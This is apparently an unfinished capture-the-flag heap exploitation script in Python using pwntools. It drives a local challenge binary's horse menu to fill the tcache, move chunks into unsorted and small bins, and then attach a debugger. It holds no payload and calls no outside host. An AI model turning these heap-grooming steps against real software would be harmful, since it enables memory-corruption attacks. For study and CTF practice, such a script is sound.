#!/usr/bin/env python3

from pwn import *

io = process("./vuln_patched")

def addhorse(i, name_len, name):
    io.recvuntil(b":")
    io.sendline(b"1")
    io.recvuntil(b"?")
    io.sendline(str(i).encode())
    io.recvuntil(b"?")
    io.sendline(str(name_len).encode())
    io.sendline(name.encode())

def rmhorse(i):
    io.recvuntil(b":")
    io.sendline(b"2")
    io.recvuntil(b"?")
    io.sendline(str(i).encode())

def changename(i, name):
    io.recvuntil(b":")
    io.sendline(b"0")
    io.recvuntil(b"?")
    io.sendline(str(i).encode())
    io.recvuntil(b":")
    io.sendline(name)
    io.recvuntil(b"?")
    io.sendline(b"99")


for i in range(9):
    addhorse(i, 144, "A"*144)

for i in range(3,9):
    rmhorse(i)

# fill tcache
rmhorse(1)
# goes to unsorted bin
rmhorse(0)
rmhorse(2)


# convert into small bins
addhorse(9, 0xa0, "A"*0xa0)
addhorse(0, 0x90, "\xff")
gdb.attach(io)
# remove 2 entries from tcache
io.interactive()

